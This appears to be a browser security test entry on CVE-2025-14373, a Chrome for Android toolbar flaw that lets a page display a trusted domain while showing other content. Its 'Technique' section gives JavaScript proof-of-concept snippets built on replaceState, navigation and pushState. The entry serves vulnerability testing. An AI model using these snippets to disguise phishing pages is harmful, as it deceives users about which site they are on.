Chrome Android Toolbar Domain Spoofing

ID: SPOOF-CHROME-01 CVE: CVE-2025-14373 Browsers: Chrome Android (pre-143.0.7499.110) Category: URL Spoofing / Phishing

Description

CVE-2025-14373 is an inappropriate implementation in Chrome's Toolbar on Android. It allows domain spoofing via history.replaceState() combined with iframe navigation, causing the toolbar to display a trusted domain while loading attacker-controlled content.

Discovered by Khalil Zhani. $2,000 bounty. CWE-1021 (Improper Restriction of Rendered UI Layers).

Technique

// Step 1: Page loads with attacker content // Step 2: Use history.replaceState to change displayed URL // Step 3: Iframe loads attacker content while toolbar shows trusted domain // Variant 1: replaceState + iframe overlay history.replaceState(null, '', '/login'); // The toolbar may show: abhikafle.com.np/login // while an iframe covers the page with ebniw.com content // Variant 2: Rapid navigation + replaceState location.href = 'https://ebniw.com/'; history.replaceState(null, '', 'https://abhikafle.com.np/dashboard'); // On vulnerable Chrome Android, toolbar lags behind // Variant 3: history manipulation timing for (let i = 0; i < 50; i++) { history.pushState({i}, '', '/path-' + i); } // Rapid history changes may confuse toolbar update

Run Test

Best tested on Chrome for Android. Desktop Chrome has different toolbar update behavior.
